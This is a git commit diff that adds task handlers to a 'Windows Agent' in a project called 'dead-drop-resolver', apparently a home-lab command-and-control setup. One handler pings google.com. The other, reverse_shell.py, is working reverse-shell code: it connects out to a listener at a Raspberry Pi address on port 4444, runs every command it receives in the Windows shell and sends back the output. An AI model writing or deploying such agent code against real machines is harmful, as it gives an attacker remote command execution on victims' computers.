1ddbf53496cc5cc396ea780cb3924e233550763f
unknown <mario.lopezparejo@gmail.com>
2026-08-27 17:22:52 +0200

    Including functionality of the tasks for the Windows Agent

--- dead-drop-resolver/windows-agent/handlers/ping.py
+++ dead-drop-resolver/windows-agent/handlers/ping.py
@@ -1,2 +1,15 @@
+import sys
+import subprocess
+
+param = '-n' if sys.platform.startswith('win') else '-c'
+hostname = "google.com"
+
 def perform_task_ping():
-    print("Ping")
+    print("Ping task started")
+    
+    response = subprocess.run(["ping", param, "1", hostname])
+    
+    if response.returncode == 0:
+        print(f"{hostname} is up!")
+    else:
+        print(f"{hostname} is down!")
--- dead-drop-resolver/windows-agent/handlers/reverse_shell.py
+++ dead-drop-resolver/windows-agent/handlers/reverse_shell.py
@@ -1,2 +1,42 @@
+import socket
+import subprocess
+import os
+
+#CONFIG
+#Raspberry Pi IP address
+SERVER_HOST = '192.168.1.147'  
+#Port listening on the Raspberry Pi
+SERVER_PORT = 4444    
+
+
 def perform_task_reverse_shell():
-    print("Reverse ssh")
+    print("Reverse shell task started")
+    try:
+        #Creation of the socket and connection to the server (RPI)
+        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        client.connect(SERVER_HOST, SERVER_PORT)
+
+        #First message:
+        client.send(f"[*] Established connection from {os.name}\n".encode())
+
+        #Loop to listen for commands and executing them
+        while True:
+            command = client.recv(1024).decode()
+            
+            #If received command is exit, exit the loop
+            if command.lower() == 'exit':
+                break
+
+            #Execute commands on the Windows shell:
+            output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
+                                      stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+
+            result = output.stdout.read() + output.stderr.read()
+
+            #Send the client a response back:
+            client.send(result or b"[*] Comand executed.\n")
+
+        client.close()
+
+    except Exception as e:
+        print(f"Error: {e}")
